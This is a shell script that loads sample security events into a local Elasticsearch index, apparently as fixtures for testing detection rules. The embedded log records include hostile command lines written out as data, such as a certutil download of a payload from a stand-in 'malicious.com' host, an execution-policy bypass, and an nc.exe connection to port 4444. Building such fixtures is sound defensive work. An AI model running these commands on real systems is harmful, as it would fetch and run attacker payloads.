#!/bin/sh
# Load test data into Elasticsearch: prefers tests/fixtures/*.ndjson when present,
# otherwise loads small embedded samples (for CI without local fixtures).

set -e

ES_HOST="${ELASTIC_HOST:-elasticsearch}"
ES_PORT="${ELASTIC_PORT:-9200}"
ES_URL="http://${ES_HOST}:${ES_PORT}"
FIXTURES_DIR="${FIXTURES_DIR:-/fixtures}"

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname "$0")" && pwd)"

echo "Waiting for Elasticsearch to be ready..."
until curl -sf "${ES_URL}/_cluster/health" | grep -q '"status":"green"\|"status":"yellow"'; do
  echo "Elasticsearch not ready yet, waiting..."
  sleep 5
done
echo "Elasticsearch is ready!"

echo "Recreating security-events index (dynamic mapping for ECS/Beats documents)..."
curl -sf -X DELETE "${ES_URL}/security-events?ignore_unavailable=true" >/dev/null || true
curl -sf -X PUT "${ES_URL}/security-events" -H "Content-Type: application/json" -d '{
  "settings": { "number_of_shards": 1, "number_of_replicas": 0 },
  "mappings": { "dynamic": true }
}' >/dev/null
echo ""

USE_FIXTURES=false
if [ -d "$FIXTURES_DIR" ]; then
  for _f in "$FIXTURES_DIR"/*.ndjson; do
    if [ -f "$_f" ]; then
      USE_FIXTURES=true
      break
    fi
  done
fi

if [ "$USE_FIXTURES" = true ]; then
  echo "Loading documents from ${FIXTURES_DIR}/*.ndjson ..."
  if ! python3 "${SCRIPT_DIR}/ingest_ndjson_fixtures.py" \
      --es-url "$ES_URL" \
      --fixtures-dir "$FIXTURES_DIR" \
      --index security-events; then
    echo "Fixture ingest reported errors; check stderr above." >&2
    exit 1
  fi
else
  echo "No *.ndjson fixtures in ${FIXTURES_DIR}; loading embedded minimal samples."
  # Embedded samples (flat ECS-style fields for simple rule tests)
  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
{"index":{}}
{"@timestamp":"2024-01-15T10:30:00Z","event.action":"process_created","event.category":"process","host.name":"WORKSTATION01","host.os.family":"windows","process.name":"powershell.exe","process.executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","process.command_line":"powershell.exe -enc ZQBjAGgAbwAgACIASABlAGwAbABvACIA","process.parent.name":"cmd.exe","process.parent.executable":"C:\\Windows\\System32\\cmd.exe","user.name":"testuser","user.domain":"TESTDOMAIN"}
{"index":{}}
{"@timestamp":"2024-01-15T10:31:00Z","event.action":"process_created","event.category":"process","host.name":"WORKSTATION01","host.os.family":"windows","process.name":"cmd.exe","process.executable":"C:\\Windows\\System32\\cmd.exe","process.command_line":"cmd.exe /c whoami","process.parent.name":"explorer.exe","process.parent.executable":"C:\\Windows\\explorer.exe","user.name":"testuser","user.domain":"TESTDOMAIN"}
{"index":{}}
{"@timestamp":"2024-01-15T10:32:00Z","event.action":"process_created","event.category":"process","host.name":"WORKSTATION02","host.os.family":"windows","process.name":"powershell.exe","process.executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","process.command_line":"powershell.exe -ExecutionPolicy Bypass -File script.ps1","process.parent.name":"services.exe","process.parent.executable":"C:\\Windows\\System32\\services.exe","user.name":"SYSTEM","user.domain":"NT AUTHORITY"}
{"index":{}}
{"@timestamp":"2024-01-15T10:33:00Z","event.action":"process_created","event.category":"process","host.name":"WORKSTATION01","host.os.family":"windows","process.name":"certutil.exe","process.executable":"C:\\Windows\\System32\\certutil.exe","process.command_line":"certutil.exe -urlcache -split -f http://malicious.com/payload.exe","process.parent.name":"cmd.exe","process.parent.executable":"C:\\Windows\\System32\\cmd.exe","user.name":"testuser","user.domain":"TESTDOMAIN"}
'
  echo ""
  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
{"index":{}}
{"@timestamp":"2024-01-15T11:00:00Z","event.action":"dns_query","event.category":"network","host.name":"WORKSTATION01","host.os.family":"windows","dns.question.name":"ufile.io","dns.question.type":"A","process.name":"chrome.exe","process.executable":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","user.name":"testuser"}
{"index":{}}
{"@timestamp":"2024-01-15T11:01:00Z","event.action":"dns_query","event.category":"network","host.name":"WORKSTATION01","host.os.family":"windows","dns.question.name":"upload.ufile.io","dns.question.type":"A","process.name":"powershell.exe","process.executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","user.name":"testuser"}
{"index":{}}
{"@timestamp":"2024-01-15T11:02:00Z","event.action":"dns_query","event.category":"network","host.name":"WORKSTATION02","host.os.family":"windows","dns.question.name":"google.com","dns.question.type":"A","process.name":"chrome.exe","process.executable":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","user.name":"admin"}
{"index":{}}
{"@timestamp":"2024-01-15T11:03:00Z","event.action":"dns_query","event.category":"network","host.name":"WORKSTATION01","host.os.family":"windows","dns.question.name":"pastebin.com","dns.question.type":"A","process.name":"curl.exe","process.executable":"C:\\Windows\\System32\\curl.exe","user.name":"testuser"}
'
  echo ""
  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
{"index":{}}
{"@timestamp":"2024-01-15T12:00:00Z","event.action":"connection_attempted","event.category":"network","host.name":"WORKSTATION01","source.ip":"192.168.1.100","destination.ip":"203.0.113.50","destination.port":443,"network.protocol":"tcp","process.name":"chrome.exe"}
{"index":{}}
{"@timestamp":"2024-01-15T12:01:00Z","event.action":"connection_attempted","event.category":"network","host.name":"WORKSTATION01","source.ip":"192.168.1.100","destination.ip":"10.0.0.5","destination.port":445,"network.protocol":"tcp","process.name":"explorer.exe"}
{"index":{}}
{"@timestamp":"2024-01-15T12:02:00Z","event.action":"connection_attempted","event.category":"network","host.name":"SERVER01","source.ip":"192.168.1.10","destination.ip":"203.0.113.100","destination.port":4444,"network.protocol":"tcp","process.name":"nc.exe"}
'
  echo ""
  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
{"index":{}}
{"@timestamp":"2024-01-15T13:00:00Z","event.action":"GetObject","event.category":"cloud","cloud.provider":"aws","cloud.region":"us-east-1","aws.cloudtrail.event_name":"GetObject","aws.cloudtrail.user_identity.type":"IAMUser","aws.cloudtrail.user_identity.user_name":"testuser","source.ip":"203.0.113.1"}
{"index":{}}
{"@timestamp":"2024-01-15T13:01:00Z","event.action":"PutObject","event.category":"cloud","cloud.provider":"aws","cloud.region":"us-east-1","aws.cloudtrail.event_name":"PutObject","aws.cloudtrail.user_identity.type":"IAMUser","aws.cloudtrail.user_identity.user_name":"admin","source.ip":"10.0.0.1"}
{"index":{}}
{"@timestamp":"2024-01-15T13:02:00Z","event.action":"CreateUser","event.category":"cloud","cloud.provider":"aws","cloud.region":"us-east-1","aws.cloudtrail.event_name":"CreateUser","aws.cloudtrail.user_identity.type":"Root","aws.cloudtrail.user_identity.user_name":"root","source.ip":"203.0.113.50"}
{"index":{}}
{"@timestamp":"2024-01-15T13:03:00Z","event.action":"ConsoleLogin","event.category":"cloud","cloud.provider":"aws","cloud.region":"us-east-1","aws.cloudtrail.event_name":"ConsoleLogin","aws.cloudtrail.user_identity.type":"IAMUser","aws.cloudtrail.user_identity.user_name":"suspicious-user","source.ip":"198.51.100.1"}
'
  echo ""
  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
{"index":{}}
{"@timestamp":"2024-01-15T14:00:00Z","event.action":"file_created","event.category":"file","host.name":"WORKSTATION01","host.os.family":"windows","file.path":"C:\\Users\\testuser\\Downloads\\malware.exe","file.name":"malware.exe","process.name":"chrome.exe","user.name":"testuser"}
{"index":{}}
{"@timestamp":"2024-01-15T14:01:00Z","event.action":"file_created","event.category":"file","host.name":"WORKSTATION01","host.os.family":"windows","file.path":"C:\\Windows\\Temp\\payload.ps1","file.name":"payload.ps1","process.name":"powershell.exe","user.name":"testuser"}
{"index":{}}
{"@timestamp":"2024-01-15T14:02:00Z","event.action":"file_created","event.category":"file","host.name":"SERVER01","host.os.family":"windows","file.path":"C:\\inetpub\\wwwroot\\shell.aspx","file.name":"shell.aspx","process.name":"w3wp.exe","user.name":"IIS APPPOOL\\DefaultAppPool"}
'
  echo ""
fi

echo "Refreshing index..."
curl -s -X POST "${ES_URL}/security-events/_refresh"
echo ""

echo "Verifying data load..."
count=$(curl -s "${ES_URL}/security-events/_count" | grep -o '"count":[0-9]*' | cut -d: -f2)
echo "Total documents in security-events: ${count}"

echo ""
echo "Test data loaded successfully!"
